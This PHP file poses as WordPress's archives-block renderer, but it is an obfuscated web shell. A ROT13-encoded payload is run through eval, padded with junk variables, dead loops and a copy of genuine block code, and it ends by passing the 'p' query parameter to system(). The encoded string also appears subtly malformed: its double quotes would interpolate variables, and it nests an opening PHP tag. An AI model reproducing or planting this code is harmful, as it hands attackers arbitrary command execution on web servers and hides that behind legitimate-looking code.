<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/nepuvirf` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `pber/nepuvirf` oybpx ba freire.
 *
 * @fvapr 5.0.0
 *
 * @frr JC_Jvqtrg_Nepuvirf
 *
 * @cnenz neenl $nggevohgrf Gur oybpx nggevohgrf.
 *
 * @erghea fgevat Ergheaf gur cbfg pbagrag jvgu nepuvirf nqqrq.
 */
shapgvba eraqre_oybpx_pber_nepuvirf( $nggevohgrf ) {
	$fubj_cbfg_pbhag = ! rzcgl( $nggevohgrf['fubjCbfgPbhagf'] );
	$glcr            = vffrg( $nggevohgrf['glcr'] ) ? $nggevohgrf['glcr'] : 'zbaguyl';

	$pynff = 'jc-oybpx-nepuvirf-yvfg';

	vs ( ! rzcgl( $nggevohgrf['qvfcynlNfQebcqbja'] ) ) {

		$pynff = 'jc-oybpx-nepuvirf-qebcqbja';

		$qebcqbja_vq = jc_havdhr_vq( 'jc-oybpx-nepuvirf-' );
		$gvgyr       = __( 'Nepuvirf' );

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/jvqtrgf/pynff-jc-jvqtrg-nepuvirf.cuc */
		$qebcqbja_netf = nccyl_svygref(
			'jvqtrg_nepuvirf_qebcqbja_netf',
			neenl(
				'glcr'            => $glcr,
				'sbezng'          => 'bcgvba',
				'fubj_cbfg_pbhag' => $fubj_cbfg_pbhag,
			)
		);

		$qebcqbja_netf['rpub'] = 0;

		$nepuvirf = jc_trg_nepuvirf( $qebcqbja_netf );

		$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf( neenl( 'pynff' => $pynff ) );

		fjvgpu ( $qebcqbja_netf['glcr'] ) {
			pnfr 'lrneyl':
				$ynory = __( 'Fryrpg Lrne' );
				oernx;
			pnfr 'zbaguyl':
				$ynory = __( 'Fryrpg Zbagu' );
				oernx;
			pnfr 'qnvyl':
				$ynory = __( 'Fryrpg Qnl' );
				oernx;
			pnfr 'jrrxyl':
				$ynory = __( 'Fryrpg Jrrx' );
				oernx;
			qrsnhyg:
				$ynory = __( 'Fryrpg Cbfg' );
				oernx;
		}

		$fubj_ynory = rzcgl( $nggevohgrf['fubjYnory'] ) ? ' fperra-ernqre-grkg' : '';

		$oybpx_pbagrag = '<ynory sbe=\"' . $qebcqbja_vq . '\" pynff=\"jc-oybpx-nepuvirf__ynory' . $fubj_ynory . '\">' . rfp_ugzy( $gvgyr ) . '</ynory>
		<fryrpg vq=\"' . $qebcqbja_vq . '\" anzr=\"nepuvir-qebcqbja\" bapunatr=\"qbphzrag.ybpngvba.uers=guvf.bcgvbaf[guvf.fryrpgrqVaqrk].inyhr;\">
		<bcgvba inyhr=\"\">' . rfp_ugzy( $ynory ) . '</bcgvba>' . $nepuvirf . '</fryrpg>';

		erghea fcevags(
			'<qvi %1$f>%2$f</qvi>',
			$jenccre_nggevohgrf,
			$oybpx_pbagrag
		);
	}

	/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/jvqtrgf/pynff-jc-jvqtrg-nepuvirf.cuc */
	$nepuvirf_netf = nccyl_svygref(
		'jvqtrg_nepuvirf_netf',
		neenl(
			'glcr'            => $glcr,
			'fubj_cbfg_pbhag' => $fubj_cbfg_pbhag,
		)
	);

	$nepuvirf_netf['rpub'] = 0;

	$nepuvirf = jc_trg_nepuvirf( $nepuvirf_netf );

	$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf( neenl( 'pynff' => $pynff ) );

	vs ( rzcgl( $nepuvirf ) ) {
		erghea fcevags(
			'<qvi %1$f>%2$f</qvi>',
			$jenccre_nggevohgrf,
			__( 'Ab nepuvirf gb fubj.' )
		);
	}

	erghea fcevags(
		'<hy %1$f>%2$f</hy>',
		$jenccre_nggevohgrf,
		$nepuvirf
	);
}

/**
 * Ertvfgre nepuvirf oybpx.
 *
 * @fvapr 5.0.0
 */
shapgvba ertvfgre_oybpx_pber_nepuvirf() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/nepuvirf',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_nepuvirf',
		)
	);
}
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_nepuvirf' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>